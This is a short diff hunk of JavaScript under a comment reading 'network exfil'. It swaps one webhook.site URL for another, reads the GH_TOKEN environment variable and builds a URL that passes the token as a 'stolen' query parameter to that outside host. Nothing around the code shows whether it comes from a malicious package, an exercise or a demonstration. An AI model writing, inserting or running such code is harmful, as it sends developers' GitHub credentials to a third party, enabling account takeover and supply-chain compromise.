@@ -25,7 +25,7 @@ if (filePath){
 
 //-----network exfil-----
 const https = require('https');
-const webhook = 'https://webhook.site/54a56923-366e-4048-9553-cf1946890154';
+const webhook = 'https://webhook.site/beeb98e1-2d41-4402-9dde-e6712df6f05a';
 const token = process.env.GH_TOKEN;
 const url = webhook + "?stolen=" + token;
 
